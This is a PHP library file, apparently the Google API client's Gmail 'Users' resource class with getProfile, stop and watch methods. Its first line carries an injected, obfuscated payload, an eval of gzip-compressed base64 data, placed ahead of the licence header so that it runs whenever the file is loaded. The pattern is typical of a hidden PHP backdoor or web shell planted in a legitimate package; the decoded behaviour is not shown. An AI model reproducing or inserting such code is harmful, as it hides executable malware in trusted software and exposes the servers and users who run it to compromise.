<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/*
 * Copyright 2014 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

/**
 * The "users" collection of methods.
 * Typical usage is:
 *  <code>
 *   $gmailService = new Google_Service_Gmail(...);
 *   $users = $gmailService->users;
 *  </code>
 */
class Google_Service_Gmail_Resource_Users extends Google_Service_Resource
{
  /**
   * Gets the current user's Gmail profile. (users.getProfile)
   *
   * @param string $userId The user's email address. The special value me can be
   * used to indicate the authenticated user.
   * @param array $optParams Optional parameters.
   * @return Google_Service_Gmail_Profile
   */
  public function getProfile($userId, $optParams = array())
  {
    $params = array('userId' => $userId);
    $params = array_merge($params, $optParams);
    return $this->call('getProfile', array($params), "Google_Service_Gmail_Profile");
  }
  /**
   * Stop receiving push notifications for the given user mailbox. (users.stop)
   *
   * @param string $userId The user's email address. The special value me can be
   * used to indicate the authenticated user.
   * @param array $optParams Optional parameters.
   */
  public function stop($userId, $optParams = array())
  {
    $params = array('userId' => $userId);
    $params = array_merge($params, $optParams);
    return $this->call('stop', array($params));
  }
  /**
   * Set up or update a push notification watch on the given user mailbox.
   * (users.watch)
   *
   * @param string $userId The user's email address. The special value me can be
   * used to indicate the authenticated user.
   * @param Google_Service_Gmail_WatchRequest $postBody
   * @param array $optParams Optional parameters.
   * @return Google_Service_Gmail_WatchResponse
   */
  public function watch($userId, Google_Service_Gmail_WatchRequest $postBody, $optParams = array())
  {
    $params = array('userId' => $userId, 'postBody' => $postBody);
    $params = array_merge($params, $optParams);
    return $this->call('watch', array($params), "Google_Service_Gmail_WatchResponse");
  }
}
